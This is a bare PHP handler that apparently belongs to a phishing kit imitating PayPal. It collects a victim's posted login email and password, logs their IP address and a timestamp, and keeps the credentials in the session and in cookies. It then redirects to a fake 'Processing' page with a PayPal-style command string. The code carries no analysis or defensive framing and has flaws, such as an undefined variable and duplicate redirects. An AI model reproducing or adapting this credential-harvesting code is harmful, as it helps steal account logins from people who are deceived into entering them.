<?php
$login_email = $_POST['login_email'];
$login_password = $_POST['login_password'];
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
session_start();
session_register("login_email");
session_register("login_password");
setcookie("emaill", $login_email, time()+3600);  /* expire in 1 hour */
setcookie("passwordd", $login_password, time()+3600);  /* expire in 1 hour */

if($email==false){ header("Location: error_login_eta.htm"); 

header("Location: Processing.php?cmd=_Processing-run&dispatch=5885d80a13c0db1fb6947b0aeae66fdbfb2119927117e3a6f876e0fd34af436580c63a156ebffe89e7779ac84ebf634880c63a156ebffe89e7779ac84ebf6348");
}
?>